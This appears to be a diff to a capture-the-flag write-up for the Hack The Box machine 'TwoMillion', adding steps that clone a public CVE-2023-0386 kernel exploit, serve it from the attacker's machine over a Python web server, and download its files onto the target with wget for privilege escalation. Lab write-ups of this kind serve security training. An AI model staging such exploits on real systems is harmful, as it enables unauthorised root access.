@@ -873,30 +873,91 @@ admin@2million:~$
 
 ``` bash
 
+admin@2million:~$ uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+admin@2million:~$
+
+```
+
+``` bash
+
+❯ git clone https://github.com/puckiestyle/CVE-2023-0386
+Cloning into 'CVE-2023-0386'...
+remote: Enumerating objects: 39, done.
+remote: Counting objects: 100% (39/39), done.
+remote: Compressing objects: 100% (28/28), done.
+remote: Total 39 (delta 16), reused 24 (delta 7), pack-reused 0 (from 0)
+Receiving objects: 100% (39/39), 429.54 KiB | 2.24 MiB/s, done.
+Resolving deltas: 100% (16/16), done.
+❯ cd CVE-2023-0386
 ❯ ls
-linpeas_darwin_amd64  linpeas_fat.sh     linpeas_linux_amd64  linpeas_linux_arm64  linpeas_small.sh
-linpeas_darwin_arm64  linpeas_linux_386  linpeas_linux_arm    linpeas.sh
+exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test
+╭─ ~/hacking/ctf/htb/easy/twomillion/scripts/CVE-2023-0386 │ main                                                  ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
+
+``` bash
+
 ❯ python3 -m http.server 9090
 
 Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
+10.129.229.66 - - [30/Jul/2026 03:47:59] "GET /exp.c HTTP/1.1" 200 -
+10.129.229.66 - - [30/Jul/2026 03:48:09] "GET /fuse.c HTTP/1.1" 200 -
+10.129.229.66 - - [30/Jul/2026 03:48:20] "GET /getshell.c HTTP/1.1" 200 -
+10.129.229.66 - - [30/Jul/2026 03:48:36] "GET /Makefile HTTP/1.1" 200 -
 
 
 ```
 
 ``` bash
 
-admin@2million:~$ wget http://10.10.15.242:9090/linpeas.sh
---2026-07-30 01:27:57--  http://10.10.15.242:9090/linpeas.sh
+admin@2million:~$ mkdir CVE
+admin@2million:~$ cd CVE/
+admin@2million:~/CVE$ wget http://10.10.15.242:9090/exp.c
+--2026-07-30 01:47:46--  http://10.10.15.242:9090/exp.c
 Connecting to 10.10.15.242:9090... connected.
 HTTP request sent, awaiting response... 200 OK
-Length: 989760 (967K) [application/x-sh]
-Saving to: ‘linpeas.sh’
+Length: 3093 (3.0K) [text/x-csrc]
+Saving to: ‘exp.c’
 
-linpeas.sh                    100%[=================================================>] 966.56K  3.80MB/s    in 0.2s
+exp.c                         100%[=================================================>]   3.02K  --.-KB/s    in 0.001s
 
-2026-07-30 01:27:58 (3.80 MB/s) - ‘linpeas.sh’ saved [989760/989760]
+2026-07-30 01:47:46 (2.77 MB/s) - ‘exp.c’ saved [3093/3093]
 
-admin@2million:~$ chmod +x linpeas.sh
-admin@2million:~$
+admin@2million:~/CVE$ wget http://10.10.15.242:9090/fuse.c
+--2026-07-30 01:47:56--  http://10.10.15.242:9090/fuse.c
+Connecting to 10.10.15.242:9090... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5616 (5.5K) [text/x-csrc]
+Saving to: ‘fuse.c’
+
+fuse.c                        100%[=================================================>]   5.48K  --.-KB/s    in 0.001s
+
+2026-07-30 01:47:56 (10.0 MB/s) - ‘fuse.c’ saved [5616/5616]
+
+admin@2million:~/CVE$ wget http://10.10.15.242:9090/getshell.c
+--2026-07-30 01:48:07--  http://10.10.15.242:9090/getshell.c
+Connecting to 10.10.15.242:9090... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 549 [text/x-csrc]
+Saving to: ‘getshell.c’
+
+getshell.c                    100%[=================================================>]     549  --.-KB/s    in 0s
+
+2026-07-30 01:48:07 (69.6 MB/s) - ‘getshell.c’ saved [549/549]
+
+admin@2million:~/CVE$ wget http://10.10.15.242:9090/Makefile
+--2026-07-30 01:48:23--  http://10.10.15.242:9090/Makefile
+Connecting to 10.10.15.242:9090... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 150 [application/octet-stream]
+Saving to: ‘Makefile’
+
+Makefile                      100%[=================================================>]     150  --.-KB/s    in 0s
+
+2026-07-30 01:48:23 (22.0 MB/s) - ‘Makefile’ saved [150/150]
+
+admin@2million:~/CVE$
 
 ```
